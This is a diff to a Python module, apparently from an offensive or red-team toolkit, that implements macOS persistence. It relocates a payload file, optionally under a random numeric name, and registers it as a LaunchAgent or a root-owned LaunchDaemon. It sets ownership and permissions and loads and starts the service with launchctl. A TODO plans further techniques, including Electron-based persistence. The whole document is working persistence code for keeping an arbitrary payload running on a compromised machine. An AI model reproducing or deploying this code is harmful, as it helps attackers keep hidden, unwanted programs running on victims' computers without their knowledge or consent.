@@ -19,8 +19,11 @@ else:
     py_sip_xnu = None
 
 
-BIN_ID:        str = "/usr/bin/id"
+BIN_CP:        str = "/bin/cp"
+BIN_CHMOD:     str = "/bin/chmod"
 BIN_LAUNCHCTL: str = "/bin/launchctl"
+BIN_ID:        str = "/usr/bin/id"
+BIN_CHOWN:     str = "/usr/sbin/chown"
 
 
 class MacPersistenceMethods(enum.Enum):
@@ -28,13 +31,15 @@ class MacPersistenceMethods(enum.Enum):
     macOS-specific persistence methods.
     """
 
-    LAUNCH_AGENT_USER     = "LaunchAgent - Current User"
+    LAUNCH_AGENT_USER = "LaunchAgent - Current User"
+
+    # Requires root access.
     LAUNCH_AGENT_LIBRARY  = "LaunchAgent - Library"
     LAUNCH_DAEMON_LIBRARY = "LaunchDaemon - Library"
 
-    # Gated behind System Integrity Protection (SIP).
-    # LAUNCH_AGENT_SYSTEM   = "LaunchAgent - System"
-    # LAUNCH_DAEMON_SYSTEM  = "LaunchDaemon - System"
+    # TODO: Implement following methods:
+    # - Root volume persistence.
+    # - Electron-based persistence ('ELECTRON_RUN_AS_NODE')
 
 
 class MacPersistence(Persistence):
@@ -72,9 +77,6 @@ class MacPersistence(Persistence):
         if self.identifier != 0:
             return MacPersistenceMethods.LAUNCH_AGENT_USER.value
 
-        # if py_sip_xnu.SipXnu().sip_object.can_edit_root:
-        #     return MacPersistenceMethods.LAUNCH_DAEMON_SYSTEM.value
-
         return MacPersistenceMethods.LAUNCH_DAEMON_LIBRARY.value
 
 
@@ -82,7 +84,12 @@ class MacPersistence(Persistence):
         """
         Get a list of supported persistence methods for macOS.
         """
-        return [method.value for method in MacPersistenceMethods]
+        methods = [method.value for method in MacPersistenceMethods]
+        if self.identifier != 0:
+            methods.remove(MacPersistenceMethods.LAUNCH_DAEMON_LIBRARY.value)
+            methods.remove(MacPersistenceMethods.LAUNCH_AGENT_LIBRARY.value)
+
+        return methods
 
 
     def _current_user_id(self) -> str:
@@ -95,6 +102,9 @@ class MacPersistence(Persistence):
     def _build_launch_service(self, name: str, arguments: list, enviroment_variables: dict = None) -> dict:
         """
         Build a launch service.
+
+        Source:
+        - https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html
         """
         return {
             "Label": name,
@@ -112,53 +122,55 @@ class MacPersistence(Persistence):
         """
 
         if Path(service_path).parent.name == "LaunchAgents":
-            current_user_id = self._current_user_id()
-
-            result = subprocess.run(
-                [BIN_LAUNCHCTL, "asuser", current_user_id, BIN_LAUNCHCTL, "load", "-w", service_path],
-                capture_output=True,
-                text=True
-            )
-            if result.returncode != 0:
-                print(result.stdout)
-                if result.stderr:
-                    print(result.stderr)
-                return False
-
-            result = subprocess.run(
-                [BIN_LAUNCHCTL, "asuser", current_user_id, BIN_LAUNCHCTL, "start", Path(service_path).stem],
-                capture_output=True,
-                text=True
-            )
-            if result.returncode != 0:
-                print(result.stdout)
-                if result.stderr:
-                    print(result.stderr)
-                return False
+            return self._start_launch_agent(service_path)
         elif Path(service_path).parent.name == "LaunchDaemons":
-            result = subprocess.run(
-                [BIN_LAUNCHCTL, "load", "-w", service_path],
-                capture_output=True,
-                text=True
-            )
+            return self._start_launch_daemon(service_path)
+
+        raise ValueError(f"Unknown service path {service_path}")
+
+
+    def _start_launch_agent(self, service_path: str) -> bool:
+        """
+        Start Launch Agent
+        """
+        current_user_id = self._current_user_id()
+
+        commands = [
+            [BIN_CHMOD, "644", service_path],
+            [BIN_CHOWN, current_user_id, service_path],
+            [BIN_LAUNCHCTL, "asuser", current_user_id, BIN_LAUNCHCTL, "load", "-w", service_path],
+            [BIN_LAUNCHCTL, "asuser", current_user_id, BIN_LAUNCHCTL, "start", Path(service_path).stem]
+        ]
+
+        for command in commands:
+            result = subprocess.run(command, capture_output=True, text=True)
             if result.returncode != 0:
                 print(result.stdout)
                 if result.stderr:
                     print(result.stderr)
                 return False
 
-            result = subprocess.run(
-                [BIN_LAUNCHCTL, "start", Path(service_path).stem],
-                capture_output=True,
-                text=True
-            )
+        return True
+
+
+    def _start_launch_daemon(self, service_path: str) -> bool:
+        """
+        Start Launch Daemon
+        """
+        commands = [
+            [BIN_CHMOD, "644", service_path],
+            [BIN_CHOWN, "root:wheel", service_path],
+            [BIN_LAUNCHCTL, "load", "-w", service_path],
+            [BIN_LAUNCHCTL, "start", Path(service_path).stem]
+        ]
+
+        for command in commands:
+            result = subprocess.run(command, capture_output=True, text=True)
             if result.returncode != 0:
                 print(result.stdout)
                 if result.stderr:
                     print(result.stderr)
                 return False
-        else:
-            raise ValueError(f"Unknown service path {service_path}")
 
         return True
 
@@ -191,7 +203,7 @@ class MacPersistence(Persistence):
         # Copy payload file to safe location.
         payload_new_name = f"{random.randint(0, 1000000)}" if randomize_name else Path(self.payload).name
         payload_file = service_directory / payload_new_name
-        subprocess.run(["cp", self.payload, str(payload_file)], capture_output=True, text=True)
+        subprocess.run([BIN_CP, self.payload, str(payload_file)], capture_output=True, text=True)
 
         print(f"  Relocated payload: {payload_file}")
         print(f"  Service file: {service_file_path}")
